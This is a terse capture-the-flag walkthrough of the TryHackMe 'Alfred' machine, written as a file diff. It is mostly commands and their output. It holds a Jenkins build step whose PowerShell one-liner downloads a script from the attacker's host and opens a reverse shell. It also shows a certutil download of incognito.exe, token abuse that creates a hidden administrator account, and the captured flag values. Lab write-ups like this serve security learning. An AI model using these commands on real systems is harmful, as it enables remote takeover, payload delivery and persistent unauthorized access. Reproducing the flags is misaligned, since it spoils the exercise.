@@ -1,0 +1,160 @@
+RECON
+root@kali:~/tryhackme/alfred# nmap -sC -sV -Pn 10.10.120.85
+PORT     STATE SERVICE    VERSION
+80/tcp   open  http       Microsoft IIS httpd 7.5
+| http-methods: 
+|_  Potentially risky methods: TRACE
+|_http-server-header: Microsoft-IIS/7.5
+|_http-title: Site doesn't have a title (text/html).
+3389/tcp open  tcpwrapped
+| ssl-cert: Subject: commonName=alfred
+| Not valid before: 2020-10-02T14:42:05
+|_Not valid after:  2021-04-03T14:42:05
+8080/tcp open  http       Jetty 9.4.z-SNAPSHOT
+| http-robots.txt: 1 disallowed entry 
+|_/
+|_http-server-header: Jetty(9.4.z-SNAPSHOT)
+|_http-title: Starting Jenkins
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+
+http://10.10.120.85:8080/job/project/configure
+
+In BUILD - Execute Windows Batch Command
+powershell iex (New-Object Net.WebClient).DownloadString('http://10.11.10.169:80/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.11.10.169 -Port 1234
+
+BUILD NOW TO RUN SCRIPT
+http://10.10.120.85:8080/job/project/build?delay=0sec
+
+root@kali:~/tryhackme/alfred# python -m SimpleHTTPServer 80
+Serving HTTP on 0.0.0.0 port 80 ...
+10.10.120.85 - - [22/Oct/2020 21:03:30] "GET /Invoke-PowerShellTcp.ps1 HTTP/1.1" 200 -
+
+EXPLOITATION
+
+GET REVERSE SHELL
+root@kali:~/tryhackme/alfred# nc -lvp 1234
+listening on [any] 1234 ...
+10.10.120.85: inverse host lookup failed: Unknown host
+connect to [10.11.10.169] from (UNKNOWN) [10.10.120.85] 49189
+Windows PowerShell running as user bruce on ALFRED
+Copyright (C) 2015 Microsoft Corporation. All rights reserved.
+
+PS C:\Program Files (x86)\Jenkins\workspace\project>
+
+
+PS C:\users\bruce\Desktop> dir
+
+
+    Directory: C:\users\bruce\Desktop
+
+
+Mode                LastWriteTime     Length Name                              
+----                -------------     ------ ----                              
+-a---        10/25/2019  11:22 PM         32 user.txt                          
+
+
+PS C:\users\bruce\Desktop> type user.txt
+79007a09481963edf2e1321abd9ae2a0
+
+PRIVESC
+
+Exploit SeImpersonatePrivilege and SeDebugPrivilege with the help of incognito 
+
+PS C:\Program Files (x86)\Jenkins\workspace\project>whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                  Description                               State   
+=============================== ========================================= ========
+SeIncreaseQuotaPrivilege        Adjust memory quotas for a process        Disabled
+SeSecurityPrivilege             Manage auditing and security log          Disabled
+SeTakeOwnershipPrivilege        Take ownership of files or other objects  Disabled
+SeLoadDriverPrivilege           Load and unload device drivers            Disabled
+SeSystemProfilePrivilege        Profile system performance                Disabled
+SeSystemtimePrivilege           Change the system time                    Disabled
+SeProfileSingleProcessPrivilege Profile single process                    Disabled
+SeIncreaseBasePriorityPrivilege Increase scheduling priority              Disabled
+SeCreatePagefilePrivilege       Create a pagefile                         Disabled
+SeBackupPrivilege               Back up files and directories             Disabled
+SeRestorePrivilege              Restore files and directories             Disabled
+SeShutdownPrivilege             Shut down the system                      Disabled
+SeDebugPrivilege                Debug programs                            Enabled 
+SeSystemEnvironmentPrivilege    Modify firmware environment values        Disabled
+SeChangeNotifyPrivilege         Bypass traverse checking                  Enabled 
+SeRemoteShutdownPrivilege       Force shutdown from a remote system       Disabled
+SeUndockPrivilege               Remove computer from docking station      Disabled
+SeManageVolumePrivilege         Perform volume maintenance tasks          Disabled
+SeImpersonatePrivilege          Impersonate a client after authentication Enabled 
+SeCreateGlobalPrivilege         Create global objects                     Enabled 
+SeIncreaseWorkingSetPrivilege   Increase a process working set            Disabled
+SeTimeZonePrivilege             Change the time zone                      Disabled
+SeCreateSymbolicLinkPrivilege   Create symbolic links                     Disabled
+
+Transfer Incognito to exploit SeImpersonatePrivilege
+PS C:\Program Files (x86)\Jenkins\workspace\project> cd C:\users\public\Documents
+PS C:\users\public\Documents> dir
+PS C:\users\public\Documents> certutil.exe -urlcache -split -f http://10.11.10.169/incognito.exe
+****  Online  ****
+  000000  ...
+  019200
+CertUtil: -URLCache command completed successfully.
+PS C:\users\public\Documents> dir
+
+
+    Directory: C:\users\public\Documents
+
+
+Mode                LastWriteTime     Length Name                              
+----                -------------     ------ ----                              
+-a---        10/23/2020   2:08 AM     102912 incognito.exe 
+
+ADD NEW USER
+PS C:\users\public\Documents> ./incognito.exe add_user hackor hack0rz
+[-] WARNING: Not running as SYSTEM. Not all tokens will be available.
+[*] Enumerating tokens
+[*] Attempting to add user hackor to host 127.0.0.1
+[+] Successfully added user
+
+ADD TO ADMIN GROUP
+PS C:\users\public\Documents> ./incognito.exe add_localgroup_user Administrators hackor
+[-] WARNING: Not running as SYSTEM. Not all tokens will be available.
+[*] Enumerating tokens
+[*] Attempting to add user hackor to local group Administrators on host 127.0.0.1
+[+] Successfully added user to local group
+
+PS C:\users\bruce\Desktop> net user hackor
+User name                    hackor
+Full Name                    hackor
+Comment                      
+User's comment               
+Country code                 000 (System Default)
+Account active               Yes
+Account expires              Never
+
+Password last set            10/23/2020 2:11:06 AM
+Password expires             12/4/2020 2:11:06 AM
+Password changeable          10/23/2020 2:11:06 AM
+Password required            Yes
+User may change password     Yes
+
+Workstations allowed         All
+Logon script                 
+User profile                 
+Home directory               
+Last logon                   10/23/2020 2:17:44 AM
+
+Logon hours allowed          All
+
+Local Group Memberships      *Administrators       
+Global Group memberships     *None                 
+The command completed successfully.
+
+RDP TO ALFRED WITH HIGHER PRIVILEGED ACCOUNT HACKOR
+rdesktop 10.10.120.85
+
+ROOT.TXT
+C:\Windows\System32\config
+
+dff0f748678f280250f25a45b8046b4a
